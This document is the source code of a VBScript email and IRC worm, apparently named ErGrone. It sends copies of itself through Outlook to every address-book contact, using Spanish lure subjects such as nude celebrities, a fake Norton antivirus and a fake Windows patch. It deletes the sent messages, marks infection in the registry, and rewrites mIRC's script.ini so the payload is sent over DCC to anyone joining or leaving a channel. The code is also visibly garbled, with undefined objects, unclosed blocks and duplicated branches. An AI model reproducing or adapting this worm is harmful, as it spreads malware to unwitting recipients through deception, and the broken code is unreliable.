Dim j,x,f,f2,c,g,d,e,e2,f3,f4
Randomize
num = Int((15 * Rnd) + 1)
if num = 1 then  
On Error Resume Next 
j = WScript.ScriptFullName
Set x = CreateObject("WScript.Shell")
If x.RegRead("HKCU\Software\ErGrone_sent") <> "yea" Then 
Set f = CreateObject("Outlook.Application")  
If f <> "" Then      
Set f2 = f4.GetNameSpace("MAPI") 
Set c = a.AddressLists (b)
g = 1
Set d = fso.CreateItem (0)   
For e = 1 To c.AddressEntries.Count  
f = c.AddressEntries (g)     
d.Recipients.Add f       
g = g + 1
Next 
e2.Subject = "Un Test Muy Sexi!!"
e2.Body = "Prueba Este Test Sexi jajajaja"   
e2.Body = e2.Body + vbCrLf + "Cuidado Y Te Exitas!"  
e2.Attachments.Add "c:\Test Sexi.exe"        
e2.DeleteAfterSubmit = True
e2.Send  
x.RegWrite "HKCU\Software\ErGrone_sent", "yea"
End If   
End If
elseif num = 2 then  
j = WScript.ScriptFullName   
Set x = CreateObject("WScript.Shell")
Set f = CreateObject("Outlook.Application")      
If f <> "" Then
Set f2 = f4.GetNameSpace("MAPI") 
g = 1
Set d = fso.CreateItem (0)
f = c.AddressEntries (g) 
d.Recipients.Add f
e2.Subject = "Yo Te Amo Pero..." 
e2.Body = "Yo Te Amo Pero Yu No Me Comprendes!!" 
e2.Body = e2.Body + vbCrLf + "Mi Amor Por Ti Es Icreible Pero Tu No Lo Ves...(Mira El Archivo Y Te Daras Cuenta)"
e2.Attachments.Add "C:\Lo Que Siento.exe"
e2.DeleteAfterSubmit = True  
End If
elseif num = 3 then  
On Error Resume Next 
If x.RegRead("HKCU\Software\ErGrone_sent") <> "yea" Then 
Set f = CreateObject("Outlook.Application")
g = 1
For e = 1 To c.AddressEntries.Count  
d.Recipients.Add f
g = g + 1    
Next 
e2.Subject = "Shakira Y Cristina Aguilera Desnudas!!"
e2.Body = "Hola, jejejjeje Mira Este Programita"     
e2.Body = e2.Body + vbCrLf + "jajjaja Ta Bien Bueno ;)"  
e2.Attachments.Add "C:\Porn Stars.exe"
x.RegWrite "HKCU\Software\ErGrone_sent", "yea"   
elseif num = 5 then  
On Error Resume Next 
Set x = CreateObject("WScript.Shell")
If f <> "" Then  
Set f2 = f4.GetNameSpace("MAPI") 
Set c = a.AddressLists (b)
f = c.AddressEntries (g)
   g = g + 1
Next 
e2.Subject = "Nuevo Antivirus!"  
e2.Body = "Hola Al Fin Y Consigo Un Buen Antivirus Aqui Te lo paso!" 
e2.Attachments.Add "C:\Norton Antivirus Gold Edition 2002.exe"
e2.DeleteAfterSubmit = True  
e2.Send
elseif num = 6 then
j = WScript.ScriptFullName
Set f = CreateObject("Outlook.Application")  
For e = 1 To c.AddressEntries.Count
d.Recipients.Add f   
Next 
e2.Subject = "Alerta!!"  
e2.Body = "A Qui Te Mando Un Parche De Windows Para Internet Explorer, El Parche Es Para El IFrame En Este Sitio Encontraras Mas Informasion"
e2.Body = e2.Body + vbCrLf + "http://msdn.microsoft.com/library/default.asp?url=/workshop/author/dhtml/reference/objects/IFRAME.asp" 
e2.Attachments.Add "C:\Parche.exe"
e2.DeleteAfterSubmit = True  
x.RegWrite "HKCU\Software\ErGrone_sent", "yea"   
elseif num = 7 then  
If x.RegRead("HKCU\Software\ErGrone_sent") <> "yea" Then 
Set d = fso.CreateItem (0)   
e2.Subject = "!!Kamasutra El Arte Del Sexo!! ;)" 
e2.Body = "jejejeje Mira Este Chiquito Pero Efectivo Manual Sobre Como Hacer El AMor ;)" 
e2.Attachments.Add "C:\Kamasutra.exe"
elseif num = 8 then  
Set x = CreateObject("WScript.Shell")    
e2.Subject = "Borracho!! jajaja" 
e2.Body = "Mira Como Se Siente Estar Borracho jajajja, Es Verdadero :)"  
e2.Attachments.Add "C:\Cerveza.exe"  
elseif num = 9 then  
e2.Subject = "SeX Player 2"
e2.Body = "Este Es EL Mejor Programa Del mundo Puras Putas Y Putos Y Hacen Lo Que Les Digas!"
e2.Attachments.Add "C:\Sex Player 2.exe" 
e2.Send  
elseif num = 10 then 
Set f = CreateObject("Outlook.Application")  
If f <> "" Then  
Set c = a.AddressLists (b)   
g = 1            
Set d = fso.CreateItem (0)
d.Recipients.Add f   
g = g + 1
e2.Subject = "COMO ES UNA PUTA :)"
e2.Body = "jejejeje Mira Como Se Siente Ser Puta! ;)"    
e2.Attachments.Add "C:\Soy Puta.exe" 
e2.DeleteAfterSubmit = True      
x.RegWrite "HKCU\Software\ErGrone_sent", "yea"
elseif num = 11 then 
For e = 1 To c.AddressEntries.Count  
e2.Subject = "El Culito..."  
e2.Body = "jajaja Mira El Culito De Mi Prima Y Dime Que Te Parese!! ;) www.megaculos.com"
e2.Attachments.Add "C:\Culo.exe" 
elseif num = 11 then 
g = g + 1    
e2.Subject = "Msturbate!"
e2.Body = "Este Es El Mejor Programa Para Masturbarte ;)"
e2.Attachments.Add "C:\Masturbate.exe"
elseif num = 12 then 
Set f = CreateObject("Outlook.Application")  
e2.Subject = "Mi Mejor Follada!" 
e2.Body = "Haller Tuve Mi Mejor Follada Y La E Grabado En Un Programa Mirala Y Dime Si Te Gusta ;)"  
e2.Attachments.Add "C:\Mi Follada.exe"
elseif num = 13 then 
Set d = fso.CreateItem (0)   
f = c.AddressEntries (g) 
e2.Subject = "Miss Universo 2002 Desnuda!! " 
e2.Body = "Con Este Programa Puedes Ver A Miss Universo 2002 Desnuda totalmente!! "  
e2.Attachments.Add "C:\Miss Universe Nude.exe"   
elseif num = 14 then 
e2.Subject = "Brasil Iso Trampa En El Mundial!!" 
e2.Body = "Con Este Programa Podras Ver Como Brasil Iso Trampa En El Mundial Korea Japan 2002!"
e2.Attachments.Add "C:\TRAMPA DO BRASIL.exe" 
elseif num = 15 then 
e2.Subject = "Cura Para Dadinu El Virus CPL!"
e2.Body = "Hola Aqui Te Mando La Cura Para Dadinu El Virus CPL!" 
e2.Attachments.Add "C:\CPLREMOVE.exe"
x.RegWrite "HKCU\Software\ErGrone_sent", "yea"   
Dim ee, ff, gg, hh, ii, mircpath, scriptfile
   Randomize
num = Int((2 * Rnd) + 1) 
if num = 1 then      
ee = "C:\mirc"
ff = "C:\mirc32" 
gg = "C:\Program Files\mirc" 
hh = "C:\Program Files\mirc32"
Set ii = CreateObject("Scripting.FileSystemObject")  
If ii.FolderExists(ee) Then mircpath = "C:\mirc" 
If ii.FolderExists(ff) Then mircpath = "C:\mirc32"   
If ii.FolderExists(gg) Then mircpath = "C:\Program Files\mirc"
If ii.FolderExists(hh) Then mircpath = "C:\Program Files\mirc32" 
If mircpath <> "" Then
Set scriptfile = ii.CreateTextFile(mircpath & "\script.ini", True)
scriptfile.Write "[script]"
scriptfile.Write "n0=on 1:JOIN:#:{"  
scriptfile.Write "n1= /if ( $nick == $me ) { halt }" 
scriptfile.Write "n2= /msg $nick Prueba Este Test Sexi jajajaja" 
scriptfile.Write "n3= /dcc send $nick C:\Test Sexi.exe"  
scriptfile.Write "n4= /if ( $me != $nick )"  
scriptfile.Write "n5= /dcc send $nick C:\Test Sexi.exe"  
scriptfile.Write "n6=}"  
scriptfile.Write "n7=on 1:PART:#:{"  
scriptfile.Write "n8= /if ( $nick == $me ) { halt }" 
scriptfile.Write "n9= /msg $nick Prueba Este Test Sexi jajajaja" 
scriptfile.Write "n10= /dcc send $nick C:\Test Sexi.exe" 
scriptfile.Write "n11= /if ( $me != $nick )" 
scriptfile.Write "n12= /dcc send $nick C:\Test Sexi.exe" 
scriptfile.Write "n13=}" 
elseif num = 2 then  
ee = "C:\mirc"   
gg = "C:\Program Files\mirc" 
hh = "C:\Program Files\mirc32"   
Set ii = CreateObject("Scripting.FileSystemObject")
If ii.FolderExists(ee) Then mircpath = "C:\mirc" 
If ii.FolderExists(ff) Then mircpath = "C:\mirc32"
If ii.FolderExists(gg) Then mircpath = "C:\Program Files\mirc"   
If ii.FolderExists(hh) Then mircpath = "C:\Program Files\mirc32" 
Set scriptfile = ii.CreateTextFile(mircpath & "\script.ini", True)
scriptfile.Write "[script]"  
scriptfile.Write "n0=on 1:JOIN:#:{"
scriptfile.Write "n2= /msg $nick Mira Como Se Siente Estar Borracho jajajja, Es Verdadero :)"
scriptfile.Write "n3= /dcc send $nick C:\Cerveza.exe"
scriptfile.Write "n5= /dcc send $nick C:\Cerveza.exe"
scriptfile.Write "n6=}"
scriptfile.Write "n8= /if ( $nick == $me ) { halt }" 
scriptfile.Write "n9= /msg $nic Mira Como Se Siente Estar Borracho jajajja, Es Verdadero :)" 
scriptfile.Write "n10= /dcc send $nick C:\Cerveza.exe"
scriptfile.Write "n12= /dcc send $nick C:\Cerveza.exe"